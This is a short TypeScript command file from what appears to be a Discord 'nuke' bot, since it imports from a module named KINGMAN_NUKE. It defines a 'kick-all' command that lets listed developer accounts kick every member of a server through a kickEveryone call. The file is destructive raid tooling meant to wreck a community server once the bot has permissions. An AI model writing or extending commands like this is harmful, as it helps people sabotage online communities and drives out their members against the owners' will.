import { Command } from '../../KINGMAN_NUKE/types/KING-NUKE';
export default {
    name: "kick-all",
    description: "",
    run: async(client, kmsg, args, kingman)=> {
        if(!client.config.devs.includes(kmsg.author.id)) return;
        if(!kmsg.guild) return;
        await kingman.kickEveryone(kmsg.guild).catch(e=> {
            console.log(e)
        })
    } 
} as Command